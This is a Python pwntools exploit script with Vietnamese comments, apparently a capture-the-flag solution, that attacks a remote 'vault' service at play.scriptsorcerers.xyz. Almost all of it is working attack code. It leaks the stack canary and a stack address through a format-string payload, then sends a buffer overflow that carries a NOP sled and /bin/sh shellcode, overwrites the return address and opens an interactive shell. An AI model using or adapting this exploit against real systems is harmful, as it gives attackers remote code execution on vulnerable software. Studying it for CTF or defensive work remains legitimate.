#!/usr/bin/env python3
from pwn import *

# --- Cấu hình ---
# Đặt kiến trúc và hệ điều hành của file thực thi
context.update(arch='i386', os='linux')

# Thay 'vault' bằng tên file binary của bạn
binary_name = './vault'
elf = context.binary = ELF(binary_name)

# --- Kết nối ---
# Chạy chương trình cục bộ để debug
# p = process(elf.path)
p = remote('play.scriptsorcerers.xyz', 10231)

# Mở GDB để debug song song (bỏ comment nếu cần)
# gdb.attach(p, gdbscript='''
#     # Đặt breakpoint tại hàm gets để kiểm tra payload
#     b *0x000112dd
#     continue
# ''')

# --- Giai đoạn 1: Leak Stack Canary và Địa chỉ Stack ---

# Chú ý quan trọng:
# Các offset (vị trí) của Canary và địa chỉ Stack có thể khác nhau
# tùy thuộc vào môi trường và cách biên dịch file.
# '%p' sẽ in ra giá trị trên stack dưới dạng con trỏ (địa chỉ).
# Bạn có thể cần thử '%2$p', '%3$p', ... để tìm đúng offset.
# Ở đây, ta giả sử canary ở offset 11 và địa chỉ stack ở offset 7.
# BẠN CÓ THỂ PHẢI THAY ĐỔI CÁC SỐ NÀY!
# Gợi ý: Gửi "%p.%p.%p.%p..." và xem output để tìm ra.
format_string_payload = b"%7$p.%11$p"

# 1. Gửi payload format string vào vault
p.sendlineafter(b'> ', b'1')
log.info(f"Gửi payload leak: {format_string_payload}")
p.sendlineafter(b'What do you want to put in your vault? ', format_string_payload)

# 2. Truy cập vault để kích hoạt printf
p.sendlineafter(b'> ', b'2')

# 3. Đọc và xử lý output bị leak
p.recvuntil(b'ur stuff: ')
leaked_output = p.recvline().strip() # Đọc dòng output chứa thông tin leak
leaked_parts = leaked_output.split(b'.')

# Xử lý các giá trị đã leak
leaked_stack_addr = int(leaked_parts[0], 16)
canary = int(leaked_parts[1], 16)

log.success(f"Đã leak được địa chỉ stack: {hex(leaked_stack_addr)}")
log.success(f"Đã leak được Stack Canary: {hex(canary)}")

# --- Giai đoạn 2: Khai thác Buffer Overflow ---

# Từ Ghidra: buffer `local_50` có size 64. Canary (`local_10`) nằm ngay sau đó.
# Offset từ đầu buffer đến canary là 64 bytes.
offset_to_canary = 64

# Offset từ canary đến địa chỉ trả về (EIP). Giá trị này thường là 12 hoặc 16 bytes
# (bao gồm các biến local khác + saved EBP). Bạn có thể phải dùng GDB để tìm chính xác.
# Ta sẽ thử với 12.
offset_to_eip = 12

# Địa chỉ chúng ta muốn nhảy đến. Ta sẽ trỏ nó vào buffer của chúng ta,
# nơi chúng ta sẽ đặt shellcode.
# `leaked_stack_addr` là địa chỉ bắt đầu của buffer `local_50`.
# Ta sẽ nhảy đến một vị trí sau địa chỉ trả về để có đủ chỗ cho NOP sled.
shellcode_address = leaked_stack_addr + 0x20 # Nhảy vào vị trí cách đầu buffer 32 bytes

log.info(f"Địa chỉ trả về sẽ được ghi đè thành: {hex(shellcode_address)}")

# Shellcode để mở /bin/sh
shellcode = asm(shellcraft.sh())

# Xây dựng payload cuối cùng
payload = b''
payload += b'\x90' * 16                         # NOP sled (để tăng tỷ lệ thành công)
payload += shellcode                            # Shellcode thực thi
payload += b'A' * (offset_to_canary - len(payload)) # Padding để điền đầy đến canary
payload += p32(canary)                          # Giá trị canary đã leak để bypass stack check
payload += b'B' * offset_to_eip                 # Padding từ canary đến EIP
payload += p32(shellcode_address)               # Địa chỉ trả về bị ghi đè, trỏ vào NOP sled

# 1. Gửi payload overflow
p.sendlineafter(b'> ', b'1')
log.info("Gửi payload cuối cùng để khai thác...")
p.sendlineafter(b'What do you want to put in your vault? ', payload)

# 2. Chọn "Exit" để hàm return, kích hoạt payload
p.sendlineafter(b'> ', b'3')
log.success("Payload đã được gửi. Chuyển sang chế độ tương tác!")

# --- Nhận shell ---
p.interactive()